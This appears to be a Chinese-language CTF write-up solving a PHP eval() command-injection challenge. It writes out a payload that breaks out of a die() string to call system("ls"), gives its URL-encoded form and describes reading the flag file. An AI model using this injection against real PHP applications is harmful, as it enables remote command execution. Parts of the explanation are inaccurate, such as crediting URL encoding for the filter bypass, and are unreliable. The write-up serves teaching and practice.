這題一進去 內容如下:

```

<?php
// PHP is the best language for hacker
// Find the flag !!
highlight_file(__FILE__);
$_ = $_GET['🍣'];

if( strpos($_, '"') || strpos($_, "'") ) 
    die('Bad Hacker :(');

eval('die("' . substr($_, 0, 16) . '");');

```

很明顯的, 16個字的 command injection

如果塞一個字串像是

> ". "hello?" ."

eval 那行就會變成

> eval('die("' . ". "hello?" ." . '");');

**另外一提, 字元 . 的功能在 php 中就是拿來串接字串**

這行我們這樣解釋:

1. 'die("' 是一個字串

2. ". "hello?" ." 是一個字串

3. '");' 是一個字串

三個字串之間用 . 接起來, 變成

> eval('die(\"\". "hello?" .\"\");');

eval 會執行裡面的字串:

> die(\"\". "hello?" .\"\");

而 die 又會執行裡面的字串

> \"\". "hello?" .\"\"

這個字串經過 . 的連接後, 等同於

> "hello?"

然後就爆炸了, "hello?" 這沒辦法執行RRR

所以換個能執行的東西 **ಠ౪ಠ**

塞個字串像是:

> ".system("ls")."

以下請自行推算ε≡ﾍ( ´∀`)ﾉ

......

GET Request 用 Postman 作一個參數

名稱是 🍣, value 是這個邪惡的字串

......

歐對了 要 bypass 字元 " 的檢查

直接用 URL encode

把字串

> ".system("ls")."

編碼成

> %22.system%28%22ls%22%29.%22

再包到 GET Request 就可了

......

得到了J個目錄底下有啥東後

看到一個怪怪的檔名

直接改改 URL 試看看存取這個檔

Flag 出來了 真是可喜可賀 可口可樂



